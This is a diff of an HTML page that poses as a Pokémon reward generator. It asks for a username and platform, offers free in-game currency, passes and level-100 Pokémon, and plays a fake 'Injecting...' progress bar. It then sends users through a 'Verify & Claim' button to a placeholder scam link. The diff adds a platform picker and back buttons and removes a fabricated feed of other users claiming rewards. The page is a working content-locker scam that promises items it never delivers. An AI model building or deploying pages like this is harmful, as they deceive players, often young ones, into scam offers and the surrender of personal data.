@@ -19,7 +19,6 @@
             background: #02050a; color: #fff; font-family: 'Inter', sans-serif; margin: 0;
             background: radial-gradient(circle at top, #0a192f 0%, #02050a 100%);
             background-attachment: fixed;
-            overflow-x: hidden;
         }
 
         nav {
@@ -37,7 +36,27 @@
             border: 1px solid var(--border); border-radius: 25px;
             width: 100%; max-width: 600px; padding: 30px;
             box-shadow: 0 20px 60px rgba(0,0,0,0.9); text-align: center;
+            position: relative;
         }
+
+        /* Platform Selector */
+        .platform-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 20px; }
+        .platform-item {
+            background: rgba(255,255,255,0.03); border: 1px solid var(--border);
+            padding: 15px; border-radius: 12px; cursor: pointer; transition: 0.3s;
+            display: flex; flex-direction: column; align-items: center; gap: 8px;
+        }
+        .platform-item i { font-size: 1.5rem; color: #888; transition: 0.3s; }
+        .platform-item.active { border-color: var(--primary); background: rgba(0,242,255,0.1); }
+        .platform-item.active i { color: var(--primary); }
+        .platform-item span { font-size: 0.75rem; font-weight: 800; text-transform: uppercase; }
+
+        /* Back Button Style */
+        .back-btn {
+            position: absolute; top: 20px; left: 20px; color: #666; cursor: pointer;
+            font-size: 0.8rem; font-weight: 700; transition: 0.3s; display: flex; align-items: center; gap: 5px;
+        }
+        .back-btn:hover { color: var(--primary); }
 
         .section-title { 
             font-family: 'Orbitron'; font-size: 0.85rem; color: var(--primary); 
@@ -51,7 +70,7 @@
         .reward-card {
             background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.08);
             border-radius: 18px; padding: 15px; cursor: pointer; transition: 0.3s;
-            display: flex; flex-direction: column; align-items: center; position: relative;
+            display: flex; flex-direction: column; align-items: center;
         }
 
         .reward-card:hover, .reward-card.active {
@@ -59,113 +78,114 @@
             transform: translateY(-4px); box-shadow: 0 8px 20px rgba(0, 242, 255, 0.2);
         }
 
-        .reward-img { width: 50px; height: 50px; object-fit: contain; margin-bottom: 10px; filter: drop-shadow(0 0 8px rgba(0,242,255,0.3)); }
+        .reward-img { width: 50px; height: 50px; object-fit: contain; margin-bottom: 10px; }
         .reward-img.char { width: 85px; height: 85px; }
 
-        .reward-card span { font-weight: 900; font-size: 0.85rem; text-transform: uppercase; margin-bottom: 2px; }
+        .reward-card span { font-weight: 900; font-size: 0.85rem; text-transform: uppercase; }
         .reward-card small { color: var(--primary); font-size: 0.6rem; font-weight: bold; text-transform: uppercase; }
 
         .input-ui {
             background: rgba(0, 0, 0, 0.5); border: 1px solid var(--border);
             border-radius: 12px; padding: 16px; width: 100%; color: #fff;
-            font-size: 1rem; margin-bottom: 12px; box-sizing: border-box; outline: none; transition: 0.3s;
+            font-size: 1rem; margin-bottom: 15px; box-sizing: border-box; outline: none;
         }
-        .input-ui:focus { border-color: var(--primary); }
 
         .btn-action {
             background: linear-gradient(90deg, var(--primary), #00a2ff);
             color: #000; width: 100%; padding: 20px; border: none; border-radius: 15px;
             font-weight: 900; font-size: 1.1rem; cursor: pointer; font-family: 'Orbitron';
-            text-transform: uppercase; transition: 0.3s; margin-top: 15px;
+            text-transform: uppercase; transition: 0.3s;
         }
         .btn-action:hover { box-shadow: 0 0 30px var(--primary); transform: translateY(-2px); }
-
-        .activity-feed {
-            margin-top: 25px; padding: 12px; background: rgba(0,0,0,0.4); border-radius: 50px; 
-            font-size: 0.7rem; color: #00f2ff; border: 1px solid rgba(0,242,255,0.1);
-        }
 
         .hidden { display: none; }
         .loader { width: 45px; height: 45px; border: 4px solid #111; border-top: 4px solid var(--primary); border-radius: 50%; animation: spin 0.8s linear infinite; margin: 20px auto; }
         @keyframes spin { 100% { transform: rotate(360deg); } }
 
         #progress-bar-container { width: 100%; background: rgba(255,255,255,0.05); height: 8px; border-radius: 10px; overflow: hidden; margin: 20px 0; }
-        #progress-bar { height: 100%; background: var(--primary); width: 0%; transition: 0.3s; box-shadow: 0 0 10px var(--primary); }
+        #progress-bar { height: 100%; background: var(--primary); width: 0%; transition: 0.3s; }
     </style>
 </head>
 <body>
 
 <nav>
     <img src="https://upload.wikimedia.org/wikipedia/commons/9/98/International_Pok%C3%A9mon_logo.svg" class="logo-nav">
-    <div style="text-align: right; line-height: 1.1;">
-        <span style="color: #2ecc71; font-size: 0.6rem; font-weight: 800;">● SYNC ACTIVE</span>
-    </div>
 </nav>
 
 <div class="container">
     <div class="main-card">
         
         <div id="ui-step1">
-            <h2 style="font-family: 'Orbitron'; color: var(--primary);">Trainer Login</h2>
-            <p style="font-size: 0.85rem; color: #888; margin-bottom: 25px;">Connect your ID to the secure distribution server</p>
-            <input type="text" class="input-ui" id="trainer-id" placeholder="Username / Trainer ID...">
-            <select class="input-ui">
-                <option>Platform: Android / iOS</option>
-                <option>Platform: Nintendo Switch</option>
-                <option>Platform: Windows PC</option>
-            </select>
-            <button class="btn-action" onclick="toStep2()">Continue to Selection</button>
+            <h2 style="font-family: 'Orbitron'; color: var(--primary); margin-top: 10px;">Trainer Access</h2>
+            <p style="font-size: 0.8rem; color: #888; margin-bottom: 25px;">Connect your account to the Global Sync Server</p>
+            
+            <input type="text" class="input-ui" id="trainer-id" placeholder="Enter Username...">
+            
+            <p style="font-size: 0.7rem; color: var(--primary); text-align: left; margin-bottom: 10px; font-weight: 800;">SELECT PLATFORM</p>
+            <div class="platform-grid">
+                <div class="platform-item active" onclick="selectPlatform(this)">
+                    <i class="fab fa-android"></i>
+                    <span>Android</span>
+                </div>
+                <div class="platform-item" onclick="selectPlatform(this)">
+                    <i class="fab fa-apple"></i>
+                    <span>iOS Device</span>
+                </div>
+            </div>
+
+            <button class="btn-action" style="width: 100%;" onclick="toStep2()">Continue to Rewards</button>
         </div>
 
         <div id="ui-step2" class="hidden">
-            <div class="section-title">1. SELECT RESOURCES</div>
+            <div class="back-btn" onclick="backTo(1)"><i class="fas fa-arrow-left"></i> BACK</div>
+            <div class="section-title">1. RESOURCES</div>
             <div class="grid-layout">
-                <div class="reward-card" onclick="selectItem(this, '50,000 Victory Points')">
+                <div class="reward-card" onclick="selectItem(this, '50,000 VP')">
                     <img src="https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/items/poke-ball.png" class="reward-img">
                     <span>50,000</span><small>Victory Points</small>
                 </div>
-                <div class="reward-card" onclick="selectItem(this, '10,000 Champion Gems')">
+                <div class="reward-card" onclick="selectItem(this, '10,000 Gems')">
                     <img src="https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/items/rare-candy.png" class="reward-img">
                     <span>10,000</span><small>Champion Gems</small>
                 </div>
-                <div class="reward-card" onclick="selectItem(this, 'Season 12 Elite Pass')">
+                <div class="reward-card" onclick="selectItem(this, 'Elite Pass')">
                     <img src="https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/items/eon-ticket.png" class="reward-img">
-                    <span>Elite Pass</span><small>Season 12</small>
+                    <span>Elite Pass</span><small>S12</small>
                 </div>
-                <div class="reward-card" onclick="selectItem(this, 'Omni Evolution Stone')">
+                <div class="reward-card" onclick="selectItem(this, 'Omni Stone')">
                     <img src="https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/items/mega-ring.png" class="reward-img">
                     <span>Omni Stone</span><small>Evolution</small>
                 </div>
             </div>
 
-            <div class="section-title">2. SELECT CHAMPION ASSET</div>
+            <div class="section-title">2. CHAMPIONS</div>
             <div class="grid-layout">
                 <div class="reward-card" onclick="selectItem(this, 'Charizard')">
                     <img src="https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/pokemon/other/official-artwork/6.png" class="reward-img char">
-                    <span>Charizard</span><small>Level 100</small>
+                    <span>Charizard</span>
                 </div>
                 <div class="reward-card" onclick="selectItem(this, 'Lucario')">
                     <img src="https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/pokemon/other/official-artwork/448.png" class="reward-img char">
-                    <span>Lucario</span><small>Level 100</small>
+                    <span>Lucario</span>
                 </div>
                 <div class="reward-card" onclick="selectItem(this, 'Garchomp')">
                     <img src="https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/pokemon/other/official-artwork/445.png" class="reward-img char">
-                    <span>Garchomp</span><small>Level 100</small>
+                    <span>Garchomp</span>
                 </div>
                 <div class="reward-card" onclick="selectItem(this, 'Mewtwo')">
                     <img src="https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/pokemon/other/official-artwork/150.png" class="reward-img char">
-                    <span>Mewtwo</span><small>Level 100</small>
+                    <span>Mewtwo</span>
                 </div>
                 <div class="reward-card" onclick="selectItem(this, 'Rayquaza')">
                     <img src="https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/pokemon/other/official-artwork/384.png" class="reward-img char">
-                    <span>Rayquaza</span><small>Level 100</small>
+                    <span>Rayquaza</span>
                 </div>
                 <div class="reward-card" onclick="selectItem(this, 'Greninja')">
                     <img src="https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/pokemon/other/official-artwork/658.png" class="reward-img char">
-                    <span>Greninja</span><small>Level 100</small>
+                    <span>Greninja</span>
                 </div>
             </div>
-            <button class="btn-action" onclick="toStep3()">Get Assets Now</button>
+            <button class="btn-action" style="width: 100%; margin-top: 20px;" onclick="toStep3()">Get Assets Now</button>
         </div>
 
         <div id="ui-sync" class="hidden">
@@ -177,15 +197,12 @@
         </div>
 
         <div id="ui-locker" class="hidden">
-            <h2 style="font-family: 'Orbitron'; color: var(--accent);">Verification Required</h2>
-            <p style="font-size: 0.85rem; line-height: 1.6; color: #ccc;">To finalize the transfer of <span id="final-res" style="color:var(--primary); font-weight:900;">Assets</span>, please verify your session below.</p>
-            <div style="padding: 25px; border: 2px dashed var(--primary); border-radius: 15px; background: rgba(0,242,255,0.03); margin: 20px 0;">
+            <div class="back-btn" onclick="backTo(2)"><i class="fas fa-arrow-left"></i> BACK</div>
+            <h2 style="font-family: 'Orbitron'; color: var(--accent); margin-top: 20px;">Verification</h2>
+            <p style="font-size: 0.85rem; color: #ccc;">Finalize the transfer of <span id="final-res" style="color:var(--primary); font-weight:900;">Assets</span> by verifying your session.</p>
+            <div style="padding: 25px; border: 2px dashed var(--primary); border-radius: 15px; margin: 20px 0;">
                 <button class="btn-action" style="margin-top:0;" onclick="window.location.href='YOUR_LINK_HERE'">Verify & Claim Now</button>
             </div>
-        </div>
-
-        <div class="activity-feed">
-            <i class="fas fa-sync fa-spin"></i> <span id="live-text">Awaiting trainer connection...</span>
         </div>
     </div>
 </div>
@@ -193,11 +210,23 @@
 <script>
     let currentSelection = "Assets";
 
+    function selectPlatform(el) {
+        document.querySelectorAll('.platform-item').forEach(i => i.classList.remove('active'));
+        el.classList.add('active');
+    }
+
     function toStep2() {
-        const id = document.getElementById('trainer-id').value;
-        if(id.length < 3) return alert('Please enter a valid Trainer ID');
+        if(document.getElementById('trainer-id').value.length < 3) return alert('Invalid Username');
         document.getElementById('ui-step1').classList.add('hidden');
         document.getElementById('ui-step2').classList.remove('hidden');
+    }
+
+    function backTo(step) {
+        document.getElementById('ui-step1').classList.add('hidden');
+        document.getElementById('ui-step2').classList.add('hidden');
+        document.getElementById('ui-locker').classList.add('hidden');
+        document.getElementById('ui-sync').classList.add('hidden');
+        document.getElementById('ui-step' + step).classList.remove('hidden');
     }
 
     function selectItem(el, name) {
@@ -213,31 +242,18 @@
         document.getElementById('final-res').innerText = currentSelection;
         
         let p = 0;
-        const msg = ["Scanning Server...", "Injecting Assets...", "Finalizing Sync...", "Complete!"];
-        const bar = document.getElementById('progress-bar');
-        const status = document.getElementById('status-text');
-
+        const msg = ["Searching...", "Injecting...", "Finalizing..."];
         const inv = setInterval(() => {
             p += 1;
-            bar.style.width = p + '%';
-            if(p % 25 === 0) status.innerText = msg[Math.floor(p/25)-1];
+            document.getElementById('progress-bar').style.width = p + '%';
+            if(p % 33 === 0) document.getElementById('status-text').innerText = msg[Math.floor(p/33)-1];
             if(p >= 100) {
                 clearInterval(inv);
-                setTimeout(() => {
-                    document.getElementById('ui-sync').classList.add('hidden');
-                    document.getElementById('ui-locker').classList.remove('hidden');
-                }, 500);
+                document.getElementById('ui-sync').classList.add('hidden');
+                document.getElementById('ui-locker').classList.remove('hidden');
             }
-        }, 60);
+        }, 50);
     }
-
-    // Dynamic Live Feed
-    const trainers = ['Volt_Trainer', 'Sarah_USA', 'Ghost_X', 'Elite_Poke', 'Ash_2026'];
-    setInterval(() => {
-        const t = trainers[Math.floor(Math.random()*trainers.length)];
-        document.getElementById('live-text').innerText = `Trainer \`${t}\` is successfully syncing assets...`;
-    }, 4500);
 </script>
-
 </body>
 </html>
